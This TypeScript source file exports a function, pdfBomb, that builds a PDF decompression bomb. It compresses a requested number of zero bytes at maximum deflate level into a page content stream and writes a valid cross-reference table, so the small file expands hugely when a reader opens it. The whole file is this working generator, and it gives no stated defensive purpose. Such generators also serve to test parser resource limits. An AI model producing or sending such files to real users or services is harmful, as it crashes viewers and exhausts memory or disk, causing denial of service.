import { createDeflate } from "node:zlib";

const CHUNK_BYTES = 1024 * 1024;

function formatEntry(offset: number, generation: number, kind: "f" | "n"): string {
  return `${String(offset).padStart(10, "0")} ${String(generation).padStart(5, "0")} ${kind} \n`;
}

function compressZeros(inflatedBytes: number): Promise<Buffer> {
  const times = Math.ceil(inflatedBytes / CHUNK_BYTES);
  const chunk = Buffer.alloc(CHUNK_BYTES);
  return new Promise((resolve, reject) => {
    const deflater = createDeflate({ level: 9 });
    const parts: Buffer[] = [];
    let settled = false;
    function fail(error: Error): void {
      if (settled) return;
      settled = true;
      reject(error);
    }
    deflater.on("data", (part: Buffer) => {
      parts.push(Buffer.from(part));
    });
    deflater.on("error", (error: Error) => {
      fail(error);
    });
    deflater.on("end", () => {
      if (settled) return;
      settled = true;
      resolve(Buffer.concat(parts));
    });
    let index = 0;
    function writeMore(): void {
      while (index < times) {
        index += 1;
        if (!deflater.write(chunk)) {
          deflater.once("drain", writeMore);
          return;
        }
      }
      deflater.end();
    }
    writeMore();
  });
}

function append(parts: Buffer[], cursor: { n: number }, chunk: Buffer): number {
  const offset = cursor.n;
  parts.push(chunk);
  cursor.n += chunk.length;
  return offset;
}

export async function pdfBomb(inflatedBytes: number): Promise<Buffer> {
  const compressed = await compressZeros(inflatedBytes);
  const parts: Buffer[] = [];
  const cursor = { n: 0 };
  append(parts, cursor, Buffer.from("%PDF-1.4\n"));
  const offsets = [0];
  offsets.push(append(parts, cursor, Buffer.from("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")));
  offsets.push(append(parts, cursor, Buffer.from("2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n")));
  offsets.push(append(parts, cursor, Buffer.from(
    "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n",
  )));
  offsets.push(append(parts, cursor, Buffer.from(
    `4 0 obj\n<< /Length ${compressed.length} /Filter /FlateDecode >>\nstream\n`,
  )));
  append(parts, cursor, compressed);
  append(parts, cursor, Buffer.from("\nendstream\nendobj\n"));
  offsets.push(append(parts, cursor, Buffer.from("5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n")));
  const xrefAt = cursor.n;
  const xref = [
    "xref\n",
    "0 6\n",
    formatEntry(0, 65535, "f"),
    ...offsets.slice(1).map((offset) => formatEntry(offset, 0, "n")),
    "trailer\n",
    "<< /Size 6 /Root 1 0 R >>\n",
    "startxref\n",
    `${xrefAt}\n`,
    "%%EOF\n",
  ].join("");
  if (Buffer.byteLength(formatEntry(0, 65535, "f")) !== 20) {
    throw new Error("xref entry is not 20 bytes");
  }
  append(parts, cursor, Buffer.from(xref));
  const pdf = Buffer.concat(parts);
  if (!pdf.subarray(xrefAt, xrefAt + 4).equals(Buffer.from("xref"))) {
    throw new Error("startxref does not point at xref");
  }
  for (let index = 1; index < offsets.length; index += 1) {
    const offset = offsets[index];
    if (offset === undefined) throw new Error(`missing xref offset ${index}`);
    const header = `${index} 0 obj`;
    if (pdf.subarray(offset, offset + header.length).toString("ascii") !== header) {
      throw new Error(`xref for object ${index} is wrong`);
    }
  }
  return pdf;
}
